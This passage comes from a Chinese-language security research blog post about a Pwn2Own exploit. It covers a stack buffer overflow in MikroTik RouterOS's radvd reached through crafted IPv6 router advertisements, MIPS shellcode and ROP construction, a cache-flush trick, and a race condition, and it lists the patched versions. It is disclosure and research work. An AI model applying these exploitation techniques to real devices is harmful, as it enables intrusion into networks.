&lt;p&gt;首先，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 會將 upstream 收到的 RA 中的 DNS advisory 儲存起來（使用 tree 作為資料結構），當 router 要往 LAN 廣播 RA 時，這些 DNS 也會被包進 RA 中一起被廣播給 LAN 的機器。在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 中，是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; 這個 function 將樹狀結構的 DNS 展開後放進 ICMPv6 的封包當中。用來傳遞給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; 的第一個參數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RA_raw&lt;/code&gt; 是一個 4096 bytes 的 buffer，也就是最終被送出的 ICMPv6。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟進 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; 後我們馬上可以發現這裡可能存在一個 stack buffer overflow 的弱點，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; 透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; 把 DNS 放進 ICMPv6 封包中而且沒有任何 boundary check，只要 DNS advisory 給的夠多就可以觸發 stack buffer overflow。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這裡使用的 DNS 來自於 RA 封包中的 RDNSS 欄位，但根據 RFC 可以發現，用來描述 RDNSS 長度的欄位只有 8-bit，所以最多僅能覆蓋 255*16 bytes，這個長度並無法使我們覆寫到 return address。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但如果這不是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 第一次收到 RA，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 就需要在接下來的封包中將舊的 DNS 標為 expired，所以實際上我們可以覆蓋兩倍的長度，也就是 255*16*2 bytes，這就足以讓我們覆蓋到 return address 了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;攻擊流程&quot;&gt;攻擊流程&lt;/h2&gt;

&lt;p&gt;有了上述的弱點，我們只要透過往目標 RouterOS 送兩個 RDNSS 欄位長度為 255 的惡意 RA 封包，就可以利用 RDNSS 中的 IPv6 地址來控制 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 程式的執行流程。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;保護&quot;&gt;保護&lt;/h3&gt;

&lt;p&gt;由於 RouterOS 使用 MIPS 的架構，所以 CPU 並不支援 NX ，但除此之外的保護也沒有被開啟。
所以只要找到好用的 ROP gadget 讓執行流程最終 jump 到我們放在 stack 上的 shellcode 就行了，聽起來極度簡單。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;shellcode-限制&quot;&gt;shellcode 限制&lt;/h3&gt;

&lt;p&gt;但是在構造 exploit 的過程中其實存在不少限制，例如，因為 IPv6 地址被儲存在 tree 結構中，所以會在排序後才放上 stack，因此我們必須保證我們建構的 payload 在經過排序之後還會是我們一開始構造的 shellcode。&lt;/p&gt;

&lt;p&gt;最簡單的方法是把 IPv6 的 prefix 當作流水號，這樣可以保證我們構造的內容照順序排列，接者只要透過 ROP gadget 跳到後半段的 shellcode 上面就算完成了。而在撰寫 shellcode 時，我們只要把每個地址的 suffix 都構造成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; ，用來跳過無法執行的流水號即可。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但由於 MIPS 存在 delay slot 機制的關係，CPU 實際上會先去執行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; 指令的後一條指令。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以我們必須把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; 往前移動才行，但緊接著的問題便是：在 delay slot 中不能使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 這個指令。這種情境下，payload 構造起來相當麻煩之外，還可能會超過我們可以使用的長度，因此這從一開始就是個壞主意。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然而眼尖的朋友肯定已經發現了，這其實是 CTF 中常見的初學等級題目，只要讓 prefix 是一個合法且不影響執行結果的指令就好了，我們把 prefix 改成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addi s8, s0, 3&lt;/code&gt;……，以此類推。除了 payload 會照排序排好之外，也節省了本來用來放 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jump&lt;/code&gt; 指令的空間。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但我們還需要稍微修改一下 payload 才行，因為我們沒有 leak stack 位址的漏洞，加上我們找不到任何可用的 gadget 來把 stack 位址從 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$sp&lt;/code&gt; 暫存器搬到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t9&lt;/code&gt; 暫存器，所以我們這裡做的事情是：首先，透過 ROP gadget 把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jalr $sp&lt;/code&gt; 指令寫到一塊記憶體上，之後再用一個 ROP gadget 跳上去執行它，這樣就可以將執行流程導向我們構造的 shellcode，聽起來是一片光明的未來：
&lt;img src=&quot;/assets/img/blog/20240524/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但光是這樣是無法順利執行 shellcode 的，因為 MIPS 針對記憶體的存取方式有兩個不同的 cache。&lt;/p&gt;

&lt;h3 id=&quot;cache&quot;&gt;cache&lt;/h3&gt;

&lt;p&gt;MIPS 上存在兩個 cache：I-cache（instruction cache）、D-cache（data cache）。&lt;/p&gt;

&lt;p&gt;當我們把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; 指令寫上記憶體時，實際上是寫到 D-cache 中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而當我們接著把執行流程控制到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; 的地址時，處理器會先去檢查這個地址的指令有沒有在 I-cache 當中，因為該位址位於 data section，在正常執行流程中肯定沒有被執行過，所以 cache 永遠都會 miss，因此處理器會接著將 memory 的內容載入 I-cache 當中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此時因為 D-cache 的內容還沒有被更新到 memory 上，I-cache 只會抓到一堆 null bytes，也就是 MIPS 上的 nop，所以程式只會執行一堆毫無意義的 nop 直到 crash 為止。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在這裡我們需要使處理器將 D-cache 的內容寫回 memory，有兩個方法可以做到這件事情：context switch 或是用盡 D-cache 所有空間（32 KB）。觸發 context switch 是比較簡單的做法，但在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 中並沒有任何 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep&lt;/code&gt; 讓我們用來觸發 context switch，其他 function 雖然也會陷進 kernel，但 context switch 發生的機率並不高，為了角逐 Pwn2Own 冠軍，讓攻擊達到趨近 100% 成功的穩定度是必須的，因此我們轉而尋找耗盡 D-cache 的 32kb 容量的方法。&lt;/p&gt;

&lt;p&gt;首先，透過簡單的檢查可以發現 RouterOS 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radomize_va_space&lt;/code&gt; 變數是 1，表示 heap 的記憶體位址不是隨機的，因此不需要 leak 就可以知道 heap 所在位址，所以我們只要接著想辦法讓 heap 分配足夠大的空間，然後寫一些無關緊要的東西上去就可以耗盡 32kb 的 D-cache 了！不過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 中並沒有太多好用的 ROP gadget，所以要構造這樣的 payload 需要串連更多 ROP gadget 才能達到同樣的目的，最終 payload 長度可能會超過我們可以覆蓋的長度。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;幸運的是如同前面所說，DNS 被存放在 tree 結構中，所以儲存時就已經在 heap 中佔據一大塊記憶體，透過 gdb 逐步執行，我們可以確定在處理 DNS 時，heap 的空間已經比 32kb 還要大！因此我們只要接著透過 GOT hijack 呼叫 memcpy 往 heap 寫 32kb 的垃圾就可以了！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最後我們的 exploit 就完成了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;結合我們另外一個為了 Pwn2Own 找的 Canon printer 弱點，攻擊流程會是&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;攻擊者作為 router 的壞鄰居，對它發送惡意的 ICMPv6 封包&lt;/li&gt;
  &lt;li&gt;在成功控制 router 後，我們進行 port forwarding，把 payload 導向在 LAN 的 Canon 印表機。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 Pwn2Own 的比賽環境中，網路環境可以被簡化得更簡單一點，如下：
&lt;img src=&quot;/assets/img/blog/20240524/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploit-除錯過程&quot;&gt;Exploit 除錯過程&lt;/h2&gt;

&lt;p&gt;就在我們覺得 $100,000 的獎金已經到手的時候，不可思議的事情發生了，那就是我們的攻擊只要在 Ubuntu 上執行就會失敗，不管這個 Ubuntu 系統是在 MacOS 內的一台虛擬機器又或者是一台 Ubuntu 實機；而 Pwn2Own 官方，基本上是使用 Ubuntu 來執行我們的 exploit，所以我們必須要解決這個問題。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們嘗試在 MacOS 上執行 exploit 並且紀錄網路封包，然後在 Ubuntu 上重放流量，可以觀察到重放會失敗：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們也嘗試在 Ubuntu 上執行 exploit 並且記錄網路封包，當然在 Ubuntu 上是失敗的，但當我們在 MacOS 重放失敗的流量時，他竟然成功了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到這裡我們猜測可能是其中一個 OS 在送出封包之前會對封包進行重新排序，而重新排序的這個行為或許在 wireshark 擷取到封包之後，所以才沒被 wireshark 紀錄到。因此我們直接寫了一個 sniffer 放在 router 上面來監控流量，且因為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_PACKET&lt;/code&gt; 類型的 socket 不會被防火牆規則影響，結果應該要非常可靠：
&lt;img src=&quot;/assets/img/blog/20240524/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然而，從兩邊錄到的封包根本&lt;strong&gt;一模一樣&lt;/strong&gt;……&lt;/p&gt;

&lt;p&gt;所以，exploit 目前只在我的 MacOS 上成功過，如果狀況不解決，唯一的方法就是我帶著我的 Mac 筆電飛去多倫多，在現場用我自己的筆電進行攻擊。但我們不可能放著這個成因不明的問題不管，誰知道會不會在比賽中也發生在我的筆電上，如果真的發生那就虧大了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在經過幾次謹慎的復盤之後我們終於知道問題的成因了——速度。因為兩個 RA 封包送出時間間隔並不大，所以很難在 wireshark 的時間軸上直接看出來，但如果計算一下會發現，兩個所花費的時間其實&lt;strong&gt;相差了 390 倍&lt;/strong&gt;。所以問題也不是出在 Ubuntu 上，而是因為 Mac 送兩個封包送的太快，不小心觸發了存在在 radvd 中的 race condition（加上極度懶惰的我沒有好好計算蓋到 return address 要花多少 bytes，直接在上面寫滿垃圾然後做 pattern match 而已，所以這個 offset 只在 race 的情況下才正確）。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;解決方法就是在送出兩個 RA 封包之間 sleep 一下，並把 payload 中的 offset 修復成沒有 race 的情況下觀察到的 offset，就可以穩定我們的攻擊腳本，把成功機率提升到 100%。&lt;/p&gt;

&lt;h3 id=&quot;fix&quot;&gt;Fix&lt;/h3&gt;

&lt;p&gt;這個漏洞在以下版本中已經被修復：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8, 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;同時我們也發現這個漏洞從 RouterOS v6.0 就已經存在了，從官網可以發現 6.0 的發布日期是 2013-05-20，也就是說這個漏洞已經存在在那裡&lt;strong&gt;九年之久&lt;/strong&gt;，卻沒有人發現他。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;呼應到我們一開始的想法：「沒有任何理智正常的人想要花時間逆向 nova binary」，得證。&lt;/p&gt;

&lt;h2 id=&quot;the-race-condition&quot;&gt;The race condition&lt;/h2&gt;

&lt;p&gt;然而這個妨礙我們輕鬆賺取 $100,000 的 race condition 是怎麼發生的？如前面所述，nova binary 中有一個 Looper 循環檢查當前有什麼事件發生，也就是説這是一個 single thread 的程式，那 race condition 是怎麼回事？（有些 nova binary 是 multi-fiber，但 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 並不是）&lt;/p&gt;

&lt;p&gt;這就要提到一個剛才沒有提到的細節，當 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 在解析從 WAN 收到的 RA 封包時，DNS 是被存入一個 「vector」 當中，然而在準備 LAN 廣播用的 RA 封包時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; 卻是把一個儲存了 DNS 的 「tree」給展開，所以這個 vector 跟 tree 之間是什麼關係？又是怎麼轉換過去的？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這也是為什麼我們沒有第一時間就在 callback 裡面找到「從 WAN 收到 RA 就會往 LAN 廣播 RA 封包」的邏輯，因為這是由兩個 process 在一陣複雜的互動之後所產生的結果。&lt;/p&gt;

&lt;p&gt;我們仔細看一下 callback 具體上做了什麼，可以看到有一個 array 負責用來存放一種叫做「 remote object」的物件，這段程式碼看起來很直觀，就是迭代存有 DNS 的 vector，然後為每個 DNS 地址都呼叫一次 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::roDNS&lt;/code&gt;，並把函式的執行結果保存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS_remoteObject&lt;/code&gt; vector 當中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-object&quot;&gt;remote object&lt;/h3&gt;

&lt;p&gt;所以什麼是 remote object？remote object 是 RouterOS 中用來跨 process 分享資源的一個機制：一個 process 負責保存共用資源，然後另外一個 prcoess 可以通過 id 向負責保存的 process 發送請求來進行增刪查改。 例如 DNS remote object 實際上放在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; process 中的 handler 2，而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 的 handler 1 只是單純保有這些物件對應的 id 而已。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;subscription-and-notification&quot;&gt;subscription and notification&lt;/h3&gt;

&lt;p&gt;當一個 remote object 被更新時，有些 process 可能會想要做出對應的行為，所以 nova binary 可以透過 IPC 事先訂閱其他 nova binary 中的 remote object。以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; 及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; 為例，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; 中的 handler 1  負責管理 ipv6 address pool，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dchp&lt;/code&gt; process 會去訂閱 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; 的 handler 1，所以當 ipv6 address pool 有異動時，dhcp 可以檢查需不需要針對這些異動進行進一步的處理，例如關閉某個 dhcp server。&lt;/p&gt;

&lt;p&gt;訂閱的這個行為是透過發送一個指令為 subscribe 的 nova message 給想要訂閱的 binary，當中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_NOTIFYCMD&lt;/code&gt; 包含了具體想要被通知的狀況是什麼。
&lt;img src=&quot;/assets/img/blog/20240524/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以在上述情況中，當有另外一個 process 往 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; 中增加 object 時，handler 1 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; 函式會被執行。
&lt;img src=&quot;/assets/img/blog/20240524/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在大部分情況裡，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; 固定會去呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendNotifies&lt;/code&gt; 來通知那些有訂閱 0xfe000b 事件的 subscribers，告訴他們訂閱的物件已被改動，所以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; 這裡會送一個 nova message 給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process，告知物件被改動後的結果。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在理解了訂閱機制之後，我們可以更全面的理解 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 之間的互動如下：&lt;/p&gt;

&lt;p&gt;當 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 從 WAN 收到 RA 封包後，它會對每個 IPv6 地址呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; 來請 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 建立相關的 remote object。而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 中的 handler 4 會負責處理這個請求，並在 handler 2 中建立對應的 ipv6 object，接著因為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 的 handler 1 訂閱了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resovler&lt;/code&gt; 的 handler 2，所以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 的 handler 2 把目前擁有的所有 DNS address 推播給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 的 handler 1，接著 handler 1 就依照他收到的 DNS address 構造 RA 封包，之後在 LAN 廣播該封包。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;race-condition-成因&quot;&gt;Race Condition 成因&lt;/h3&gt;

&lt;p&gt;Race condition 的問題實際上出在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; 的實作，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; 中使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; 來發送 nova message，而這個方法是 non-blocking 的，表示 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 中的 remote object 並不會馬上知道它在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 中對應的 id 是什麼。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因此若第二個封包太快到達，以至於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 還無從得知 remote object 的 id 是什麼的時候，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 就沒有辦法第一時間確實的刪除這些物件，只能先將它們標記成 destroyed 進行軟刪除，這就造成了 race condition 的產生。
&lt;img src=&quot;/assets/img/blog/20240524/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們一步一步的分解整個流程：&lt;/p&gt;

&lt;p&gt;首先，因為兩個 process 都是 single thread，我們可以假設 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 兩個 process 現在正在執行他們的第一個 loop。&lt;/p&gt;

&lt;p&gt;當 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 從 WAN 收到一個只有一個 DNS address 的 RA 時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 會向 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 發送一個創建 remote object 的請求。
&lt;img src=&quot;/assets/img/blog/20240524/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 在收到第一個請求的同時會設定一個 timer，因爲在 IPC 的機制中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 無法知道多少個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; 請求屬於同一批，所以它非常簡單的設了一個一次性的 timer，時間到了才送出一次 notification。除此之外，每次 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 處理完單個創建的請求後應該要回傳一個 nova message 作為 response，通知 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 剛剛被新增的 remote object 的 id 是多少，而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 會透過方才送出請求時一併註冊的一次性 ResponseHandler 來處理這個回應。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但如果第二個 RA 封包太快被送到，以至於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 都還沒有把 id 透過 response 送回來時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 只能先把舊的 DNS remote object 標記成 destroyed 進行軟刪除。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接著 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 繼續為收到的第二個 RA 封包中的 RDNSS 欄位建立新的 DNS remote object，但由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 還沒有結束第一個迭代，所以這個新的請求會停留在 socket 裡面等待下一個迭代才處理。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下來回到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;，第一個迭代以回傳 id 給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 做收尾，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 的 ResponseHandler 會根據拿到的 id 去更新 remote object，但由於對應的 remote object 已經被標記成刪除，所以 ResponseHandler 不會去更新 object id，而是直接刪除該 object。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ResponseHandler 在刪除完 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; 中保存的 remote object 之後，會發送一個 delete object 的 message 給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;，告知它對應的 remote object 已經不再使用所以要進行刪除，但一樣會先卡在 socket 裡面等待處理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接著 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 進入了第二次迭代，它會先拿到 socket 中為了第二個 RA 創建 remote object 的請求，為第二個 RA 的 DNS 創建對應的 remote object：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但在接著處理 delete 請求之前，先前設定的 timer 時間到了，所以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; 會呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::sendChanges&lt;/code&gt; 來通知所有的訂閱者現在 resolver 知道的 DNS 有哪些，因為 object 1 還沒有被刪除，因此 resolver 會把兩次的請求創建的 DNS 通通都推播出去。&lt;/p&gt;

&lt;p&gt;radvd 在收到這樣的資訊之後就會馬上構造用來在 LAN 廣播的 RA 封包，此時兩次的請求結果被混在一起了，這也就是為什麼一開始我們的攻擊只會在 MacOS 上成功的原因。雖然這個 race condition 聽起來很難觸發（刪除請求比 timer 先進行處理的話就不會觸發），但這是因為方便解釋，所以整個流程被我們大幅簡化了，實際上只要兩個封包到達的時間間隔夠短這個 race 就一定會成功。
&lt;img src=&quot;/assets/img/blog/20240524/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;小結-1&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;透過上面的分析，我們在 RouterOS 的 remote object 機制中找到了一個 race condition 的 pattern：&lt;/p&gt;
&lt;ul&gt;
